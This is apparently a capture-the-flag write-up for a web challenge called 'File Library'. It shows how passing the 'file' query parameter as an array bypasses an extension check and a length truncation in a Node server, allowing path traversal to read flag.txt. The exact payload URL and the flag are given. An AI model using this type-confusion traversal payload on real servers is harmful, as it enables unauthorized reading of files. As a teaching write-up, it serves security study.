# File Library

Source: [server.js](./server.js)

Reading through the server source, we notice that the server never checks if the `file` query param is actually a string. We can abuse this fact to bypass the validation checks using array query params. The two checks we need to bypass are the following:

```js
function allowedFileType(file) {
	const format = file.slice(file.indexOf(".") + 1);

	if (format == "js" || format == "ts" || format == "c" || format == "cpp") {
		return true;
	}

	return false;
}
```

```js
if (file.length > 5) {
	file = file.slice(0, 5);
}
```

If we pass an array that has more than 5 elements, they are stripped off. However, `allowedFileType` runs before the length check, so we can use the trailing elements to meet `allowedFileType`'s requirements before they are stripped off by the length check.

Payload: http://chall.csivit.com:30222/getFile?file=&file=&file=&file=&file=/../flag.txt&file=.&file=cpp

Flag: csictf{5h0uld_5tr1ng1fy_th3_p4r4ms}
